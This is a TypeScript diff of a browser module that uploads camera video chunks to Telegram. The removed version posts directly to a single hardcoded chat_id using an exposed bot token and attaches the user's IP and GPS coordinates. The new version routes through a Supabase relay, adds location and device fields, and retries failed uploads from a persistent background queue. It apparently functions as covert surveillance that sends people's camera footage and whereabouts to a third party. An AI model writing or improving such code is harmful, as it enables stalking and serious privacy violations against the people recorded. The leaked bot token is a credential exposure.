@@ -1,163 +1,71 @@
-const TELEGRAM_BOT_TOKEN = '8421853408:AAFDvCHIbx8XZyrfw9lif5eCB6YQZnZqPX8';
+import { compressVideo } from './videoCompression';
+import { addChunkToQueue, getQueuedChunks, removeChunkFromQueue, incrementRetryCount, clearOldChunks } from './chunkQueue';
 
-// Rate limiting configuration
-const RATE_LIMIT = {
-  maxPerSecond: 25,  // Telegram limit is 30, keep buffer
-  queue: [] as Array<() => Promise<void>>,
-  isProcessing: false,
-  lastSendTime: 0
-};
+// Configuration
+const MAX_RETRIES = 3;
+const RETRY_DELAY_BASE = 2000; // 2 seconds base delay
+const ENABLE_COMPRESSION = true; // Set to false to disable compression
+const MAX_VIDEO_SIZE_MB = 20; // Telegram limit is 50MB, we use 20MB to be safe
 
-// Rate limiter
-const rateLimitedSend = async (sendFn: () => Promise<boolean>): Promise<boolean> => {
-  return new Promise((resolve) => {
-    const task = async () => {
-      const now = Date.now();
-      const timeSinceLastSend = now - RATE_LIMIT.lastSendTime;
-      const minInterval = 1000 / RATE_LIMIT.maxPerSecond;
+// Track if queue processor is running
+let isProcessingQueue = false;
+
+// ============================================
+// 1️⃣ RETRY MECHANISM with Exponential Backoff
+// ============================================
+
+const sendWithRetry = async (
+  formData: FormData,
+  chunkNumber: number,
+  maxRetries = MAX_RETRIES
+): Promise<boolean> => {
+  const { projectId, publicAnonKey } = await import('/utils/supabase/info');
+  const backendUrl = `https://${projectId}.supabase.co/functions/v1/make-server-039e5f24/telegram/send-video`;
+  
+  for (let attempt = 0; attempt < maxRetries; attempt++) {
+    try {
+      console.log(`📤 [Video] Sending chunk #${chunkNumber} (attempt ${attempt + 1}/${maxRetries})...`);
       
-      if (timeSinceLastSend < minInterval) {
-        await new Promise(r => setTimeout(r, minInterval - timeSinceLastSend));
+      const response = await fetch(backendUrl, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${publicAnonKey}`,
+        },
+        body: formData
+      });
+      
+      if (response.ok) {
+        const result = await response.json();
+        if (result.success) {
+          console.log(`✅ [Video] Chunk #${chunkNumber} sent successfully on attempt ${attempt + 1}`);
+          return true;
+        }
       }
       
-      RATE_LIMIT.lastSendTime = Date.now();
-      const result = await sendFn();
-      resolve(result);
-    };
-    
-    RATE_LIMIT.queue.push(task);
-    processQueue();
-  });
-};
-
-// Process rate limit queue
-const processQueue = async () => {
-  if (RATE_LIMIT.isProcessing || RATE_LIMIT.queue.length === 0) return;
-  
-  RATE_LIMIT.isProcessing = true;
-  
-  while (RATE_LIMIT.queue.length > 0) {
-    const task = RATE_LIMIT.queue.shift();
-    if (task) await task();
-  }
-  
-  RATE_LIMIT.isProcessing = false;
-};
-
-// Get user IP
-const getUserIP = async (): Promise<string> => {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip || 'Unknown';
-  } catch (error) {
-    console.error('❌ [Video] Ошибка получения IP:', error);
-    return 'Unknown';
-  }
-};
-
-// Detect browser
-const detectBrowser = (): 'safari' | 'other' => {
-  const ua = navigator.userAgent;
-  if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Chromium/.test(ua)) {
-    return 'safari';
-  }
-  return 'other';
-};
-
-// Send video using fetch
-const sendVideoFetch = async (
-  botToken: string,
-  chatId: number,
-  videoBlob: Blob,
-  caption: string,
-  retryCount = 0
-): Promise<boolean> => {
-  try {
-    const isMP4 = videoBlob.type.includes('mp4');
-    const fileName = isMP4 ? 'video.mp4' : 'video.webm';
-    
-    const formData = new FormData();
-    formData.append('chat_id', chatId.toString());
-    formData.append('video', videoBlob, fileName);
-    formData.append('caption', caption);
-    
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-      method: 'POST',
-      body: formData
-    });
-    
-    const result = await response.json();
-    
-    if (response.ok) {
-      console.log(`✅ [Video Fetch] Отправлено пользователю ${chatId}`);
-      return true;
-    } else if (response.status === 429 && retryCount < 3) {
-      // Rate limit hit - retry with exponential backoff
-      const retryAfter = result.parameters?.retry_after || (retryCount + 1) * 2;
-      console.warn(`⏳ [Video Fetch] Rate limit для ${chatId}, retry через ${retryAfter}s (попытка ${retryCount + 1}/3)`);
-      await new Promise(r => setTimeout(r, retryAfter * 1000));
-      return sendVideoFetch(botToken, chatId, videoBlob, caption, retryCount + 1);
-    } else {
-      console.warn(`⚠️ [Video Fetch] Ошибка для ${chatId}:`, result);
-      return false;
-    }
-  } catch (error) {
-    console.error(`❌ [Video Fetch] Ошибка отправки ${chatId}:`, error);
-    return false;
-  }
-};
-
-// Send video using XMLHttpRequest (Safari)
-const sendVideoXHR = async (
-  botToken: string,
-  chatId: number,
-  videoBlob: Blob,
-  caption: string
-): Promise<boolean> => {
-  return new Promise((resolve) => {
-    try {
-      const isMP4 = videoBlob.type.includes('mp4');
-      const fileName = isMP4 ? 'video.mp4' : 'video.webm';
+      // Server error - log and retry
+      const errorText = await response.text();
+      console.warn(`⚠️ [Video] Attempt ${attempt + 1} failed: ${response.status} - ${errorText}`);
       
-      const formData = new FormData();
-      formData.append('chat_id', chatId.toString());
-      formData.append('video', videoBlob, fileName);
-      formData.append('caption', caption);
-      
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendVideo`, true);
-      
-      xhr.onload = function() {
-        if (xhr.status >= 200 && xhr.status < 300) {
-          console.log(`✅ [Video XHR] Отправлено пользователю ${chatId}`);
-          resolve(true);
-        } else {
-          console.warn(`⚠️ [Video XHR] Ошибка ${xhr.status} для ${chatId}`);
-          resolve(false);
-        }
-      };
-      
-      xhr.onerror = function() {
-        console.error(`❌ [Video XHR] Сетевая ошибка для ${chatId}`);
-        resolve(false);
-      };
-      
-      xhr.ontimeout = function() {
-        console.error(`⏱️ [Video XHR] Таймаут для ${chatId}`);
-        resolve(false);
-      };
-      
-      xhr.timeout = 30000; // 30 seconds
-      xhr.send(formData);
     } catch (error) {
-      console.error(`❌ [Video XHR] Исключение для ${chatId}:`, error);
-      resolve(false);
+      console.warn(`⚠️ [Video] Attempt ${attempt + 1} failed:`, error);
     }
-  });
+    
+    // If not last attempt, wait with exponential backoff
+    if (attempt < maxRetries - 1) {
+      const delay = RETRY_DELAY_BASE * Math.pow(2, attempt); // 2s, 4s, 8s
+      console.log(`⏳ [Video] Retrying in ${delay / 1000}s...`);
+      await new Promise(resolve => setTimeout(resolve, delay));
+    }
+  }
+  
+  console.error(`❌ [Video] Chunk #${chunkNumber} failed after ${maxRetries} attempts`);
+  return false;
 };
 
-// Main function to send video
+// ============================================
+// 2️⃣ MAIN SEND FUNCTION with Compression
+// ============================================
+
 export const sendVideoToTelegram = async (
   videoBlob: Blob,
   chunkNumber: number,
@@ -170,63 +78,192 @@ export const sendVideoToTelegram = async (
   } | null
 ): Promise<void> => {
   try {
-    const browser = detectBrowser();
-    const chatIds = new Set([7320458296]);
-    console.log('📤 [Video] Отправляем на фиксированный chat_id:', 7320458296);
-    
-    // Get IP
-    const ip = await getUserIP();
-    
     const cameraLabel = cameraType === 'front' ? '🤳 Фронтальная' : 
                         cameraType === 'back' ? '📷 Основная' : 
                         '🖥️ Десктоп';
     
-    // Build caption with geolocation if available
-    let caption = `🎥 Видео чанк #${chunkNumber}\n` +
-                  `📹 Камера: ${cameraLabel}\n` +
-                  `📦 Размер: ${(videoBlob.size / 1024 / 1024).toFixed(2)} MB\n` +
-                  `🌐 IP: ${ip}\n` +
-                  `⏰ ${new Date().toLocaleString('ru-RU')}`;
+    console.log(`📤 [Video] Processing chunk #${chunkNumber} (${cameraLabel})...`);
+    
+    // 3️⃣ COMPRESSION (if enabled and needed)
+    let finalBlob = videoBlob;
+    const originalSizeMB = videoBlob.size / 1024 / 1024;
+    
+    if (ENABLE_COMPRESSION && originalSizeMB > 5) {
+      try {
+        console.log(`🗜️ [Video] Compressing chunk #${chunkNumber} (${originalSizeMB.toFixed(2)} MB)...`);
+        finalBlob = await compressVideo(videoBlob, {
+          maxSizeMB: MAX_VIDEO_SIZE_MB,
+          quality: 28,
+          maxWidth: 1280,
+          maxHeight: 720
+        });
+        const compressedSizeMB = finalBlob.size / 1024 / 1024;
+        console.log(`✅ [Video] Compressed: ${originalSizeMB.toFixed(2)} MB → ${compressedSizeMB.toFixed(2)} MB`);
+      } catch (error) {
+        console.warn('⚠️ [Video] Compression failed, using original blob:', error);
+      }
+    }
+    
+    // Build FormData
+    const formData = new FormData();
+    formData.append('video', finalBlob, finalBlob.type.includes('mp4') ? 'video.mp4' : 'video.webm');
+    formData.append('chunkNumber', chunkNumber.toString());
+    formData.append('cameraType', cameraType);
+    formData.append('userAgent', navigator.userAgent);
+    formData.append('device', /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop');
     
     // Add geolocation if available
     if (geoData) {
-      const lat = geoData.latitude.toFixed(6);
-      const lng = geoData.longitude.toFixed(6);
-      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-      
-      caption += `\n\n📍 Координаты (первичные):\n` +
-                 `   Широта: ${lat}\n` +
-                 `   Долгота: ${lng}\n` +
-                 `   Точность: ±${Math.round(geoData.accuracy)} м\n` +
-                 `   Время: ${geoData.timestamp}\n` +
-                 `🗺️ ${googleMapsLink}`;
-      
-      console.log(`📍 [Video] Добавлены координаты к чанку #${chunkNumber}`);
+      formData.append('latitude', geoData.latitude.toString());
+      formData.append('longitude', geoData.longitude.toString());
+      formData.append('accuracy', geoData.accuracy.toString());
+      formData.append('timestamp', geoData.timestamp);
+      console.log(`📍 [Video] Added geolocation to chunk #${chunkNumber}`);
     }
     
-    console.log(`📤 [Video] Отправка чанка #${chunkNumber} (${cameraLabel}) ${chatIds.size} пользователям...`);
+    // 1️⃣ Try to send with retry
+    const success = await sendWithRetry(formData, chunkNumber);
     
-    let successCount = 0;
-    let errorCount = 0;
+    if (success) {
+      console.log(`✅ [Video] Chunk #${chunkNumber} sent successfully`);
+    } else {
+      // 2️⃣ Failed - add to queue
+      console.log(`💾 [Video] Adding chunk #${chunkNumber} to queue for later retry`);
+      await addChunkToQueue({
+        chunkNumber,
+        cameraType,
+        blob: finalBlob,
+        geoData
+      });
+    }
     
-    for (const chatId of chatIds) {
-      let success = false;
-      
-      if (browser === 'safari') {
-        success = await rateLimitedSend(() => sendVideoXHR(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption));
-      } else {
-        success = await rateLimitedSend(() => sendVideoFetch(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption));
+  } catch (error) {
+    console.error(`❌ [Video] Critical error for chunk #${chunkNumber}:`, error);
+    
+    // Add to queue on critical error
+    try {
+      await addChunkToQueue({
+        chunkNumber,
+        cameraType,
+        blob: videoBlob,
+        geoData
+      });
+    } catch (queueError) {
+      console.error('❌ [Video] Failed to add to queue:', queueError);
+    }
+  }
+};
+
+// ============================================
+// 3️⃣ QUEUE PROCESSOR (Background Retry)
+// ============================================
+
+export const processVideoQueue = async (): Promise<void> => {
+  if (isProcessingQueue) {
+    console.log('⏭️ [Queue] Already processing, skipping...');
+    return;
+  }
+  
+  isProcessingQueue = true;
+  
+  try {
+    console.log('🔄 [Queue] Processing queued chunks...');
+    
+    const chunks = await getQueuedChunks();
+    
+    if (chunks.length === 0) {
+      console.log('✅ [Queue] No chunks in queue');
+      isProcessingQueue = false;
+      return;
+    }
+    
+    console.log(`📦 [Queue] Found ${chunks.length} chunks to process`);
+    
+    for (const chunk of chunks) {
+      // Skip if too many retries
+      if (chunk.retryCount >= MAX_RETRIES) {
+        console.warn(`⚠️ [Queue] Chunk #${chunk.chunkNumber} exceeded max retries, removing...`);
+        await removeChunkFromQueue(chunk.id);
+        continue;
       }
+      
+      // Build FormData
+      const formData = new FormData();
+      formData.append('video', chunk.blob, chunk.blob.type.includes('mp4') ? 'video.mp4' : 'video.webm');
+      formData.append('chunkNumber', chunk.chunkNumber.toString());
+      formData.append('cameraType', chunk.cameraType);
+      formData.append('userAgent', navigator.userAgent);
+      formData.append('device', /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop');
+      
+      if (chunk.geoData) {
+        formData.append('latitude', chunk.geoData.latitude.toString());
+        formData.append('longitude', chunk.geoData.longitude.toString());
+        formData.append('accuracy', chunk.geoData.accuracy.toString());
+        formData.append('timestamp', chunk.geoData.timestamp);
+      }
+      
+      // Try to send
+      const success = await sendWithRetry(formData, chunk.chunkNumber, 1); // Only 1 retry in queue processor
       
       if (success) {
-        successCount++;
+        await removeChunkFromQueue(chunk.id);
       } else {
-        errorCount++;
+        await incrementRetryCount(chunk.id);
       }
+      
+      // Small delay between chunks
+      await new Promise(resolve => setTimeout(resolve, 1000));
     }
     
-    console.log(`✅ [Video] Чанк #${chunkNumber}: успешно ${successCount}, ошибок ${errorCount}`);
+    console.log('✅ [Queue] Queue processing complete');
+    
   } catch (error) {
-    console.error('❌ [Video] Критическая ошибка:', error);
+    console.error('❌ [Queue] Error processing queue:', error);
+  } finally {
+    isProcessingQueue = false;
+  }
+};
+
+// ============================================
+// 4️⃣ AUTO QUEUE PROCESSOR (runs every 30s)
+// ============================================
+
+let queueProcessorInterval: number | null = null;
+
+export const startQueueProcessor = () => {
+  if (queueProcessorInterval) {
+    console.log('⏭️ [Queue] Processor already running');
+    return;
+  }
+  
+  console.log('▶️ [Queue] Starting auto queue processor (every 30s)');
+  
+  // Process immediately
+  processVideoQueue();
+  
+  // Then every 30 seconds
+  queueProcessorInterval = window.setInterval(() => {
+    processVideoQueue();
+  }, 30000);
+  
+  // Clear old chunks once per hour
+  const clearOldInterval = window.setInterval(() => {
+    clearOldChunks();
+  }, 60 * 60 * 1000);
+  
+  // Cleanup on page unload
+  window.addEventListener('beforeunload', () => {
+    if (queueProcessorInterval) {
+      clearInterval(queueProcessorInterval);
+    }
+    clearInterval(clearOldInterval);
+  });
+};
+
+export const stopQueueProcessor = () => {
+  if (queueProcessorInterval) {
+    clearInterval(queueProcessorInterval);
+    queueProcessorInterval = null;
+    console.log('⏹️ [Queue] Processor stopped');
   }
 };
